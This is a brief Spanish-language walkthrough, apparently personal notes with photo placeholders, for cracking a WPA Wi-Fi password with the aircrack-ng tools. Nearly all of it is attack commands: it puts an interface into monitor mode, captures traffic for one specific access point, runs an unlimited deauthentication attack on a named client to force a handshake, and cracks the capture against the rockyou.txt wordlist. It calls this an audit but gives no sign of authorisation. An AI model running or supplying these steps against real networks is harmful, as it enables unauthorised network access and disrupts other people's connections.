Vemos cual es el nombre de nuestra interfaz de red

	iwconfig

Montamos a nuestra interfaz

	airmon-ng start wlp0s20f3  

### Foto 

Analizamos toda la red

	airodump-ng wlp0s20f3mon

### Foto



```bash
airodump-ng -c1 -w auditoria -d 50:4E:DC:38:C2:60  wlp0s20f3mon
```
### Foto
```
aireplay-ng --deauth 0 -a 50:4E:DC:38:C2:60 -c B2:11:8E:B5:DF:0D  wlp0s20f3mon
```
### Foto

Esperamos a que salga en la parte de arriba 

> WPA handshake: 50:4E:DC:38:C2:60 



Comparamos la contrasen con nuestro archivo 

	aircrack-ng auditoria-01.cap -w rockyou.txt

### Foto



Regresamos a nuestra interfaz normal

	airmon-ng stop wlp0s20f3mon


